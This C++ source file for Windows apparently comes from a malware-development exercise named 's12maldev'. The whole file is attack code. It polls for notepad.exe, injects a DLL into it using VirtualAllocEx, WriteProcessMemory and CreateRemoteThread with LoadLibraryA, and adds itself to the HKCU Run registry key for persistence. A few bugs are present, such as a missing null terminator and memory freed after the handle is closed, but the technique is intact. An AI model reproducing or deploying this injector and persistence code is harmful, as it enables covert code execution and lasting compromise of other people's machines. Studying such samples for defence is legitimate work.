#include <windows.h>
#include <iostream>
#include <tlhelp32.h>
#include "validations.h"
 
using namespace std;
 
// Function to get the Process ID (PID) by its name.
int getPIDbyProcName(const char* procName) {
    int pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // Take a snapshot of all running processes
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
 
    if (Process32First(hSnap, &pe32) != FALSE) {
        while (pid == 0 && Process32Next(hSnap, &pe32) != FALSE) {
            if (strcmp(pe32.szExeFile, procName) == 0) { // Check if the process name matches the target name
                pid = pe32.th32ProcessID; // Set the PID if a match is found
            }
        }
    }
    CloseHandle(hSnap); // Close the handle to the snapshot
    return pid; // Return the PID, or 0 if not found
}
 
// Function to inject a DLL into a target process.
bool DLLinjector(DWORD pid, char* dllPath){
    typedef LPVOID memory_buffer;
 
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); // Open the target process with all access rights
    if (hProc == NULL) {
        cout << "OpenProcess() failed: " << GetLastError() << endl;
        return false;
    }
 
    HMODULE hKernel32 = GetModuleHandle("Kernel32"); // Get the handle to Kernel32.dll
    void *lb = GetProcAddress(hKernel32, "LoadLibraryA"); // Get the address of LoadLibraryA function
    memory_buffer allocMem = VirtualAllocEx(hProc, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE); // Allocate memory in the target process
    if (allocMem == NULL) {
        cout << "VirtualAllocEx() failed: " << GetLastError() << endl;
        return false;
    }
    WriteProcessMemory(hProc, allocMem, dllPath, strlen(dllPath), NULL); // Write the DLL path to the allocated memory
    HANDLE rThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)lb, allocMem, 0, NULL); // Create a remote thread in the target process to load the DLL
    if (rThread == NULL) {
        cout << "CreateRemoteThread() failed: " << GetLastError() << endl;
        return false;
    }
    CloseHandle(hProc); // Close the handle to the target process
    FreeLibrary(hKernel32); // Free the handle to Kernel32.dll
    VirtualFreeEx(hProc, allocMem, strlen(dllPath), MEM_RELEASE); // Free the allocated memory in the target process
    return true;
}
 
// Function to add the executable to the Windows Run registry key.
int runkeys(const char* exe) {
    HKEY hkey = NULL;
    LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey); // Open the Windows Run registry key
    if (res == ERROR_SUCCESS) {
        RegSetValueEx(hkey, (LPCSTR)"s12maldev", 0, REG_SZ, (unsigned char*)exe, strlen(exe)); // Set the value with the executable path
        RegCloseKey(hkey); // Close the registry key handle
    }
    return 0;
}
 
int main(int argc, char *argv[]){
    const char* path = "C:\\s12maldev.dll"; // DLL path
    const char* process = "notepad.exe"; // Target process name
    cout << "Path: " << path << "\n" << "Process: " << process << endl;
 
    // Loop to continuously monitor the target process
    while(true){
        if(IsProcessRunning(process)){ // Check if the target process is running
            int pid = getPIDbyProcName(process); // Get the PID of the target process
            if(IsDLLLoaded(pid, L"s12maldev.dll")){ // Check if the DLL is already loaded in the target process
                OutputDebugStringA("DLL already loaded"); // Output a debug message indicating the DLL is already loaded
            }
            else{
                DLLinjector(pid, path); // Inject the DLL into the target process
            }
            // Get the path of the current executable and add it to the Windows Run registry key
            char buffer[MAX_PATH];
            GetModuleFileName(NULL, buffer, MAX_PATH);
            std::string fullPath(buffer);
 
            std::size_t found = fullPath.find_last_of("\\");
            std::string exeDirectory = fullPath.substr(0, found);
            std::string exeName = fullPath.substr(found + 1);
 
            std::string fullPathToExe = exeDirectory + "\\" + exeName;
            OutputDebugStringA(fullPathToExe.c_str());
            runkeys(fullPathToExe.c_str());
        }
        Sleep(1000); // Wait for 1 second before checking the process again
    } 
     
    return 0;
}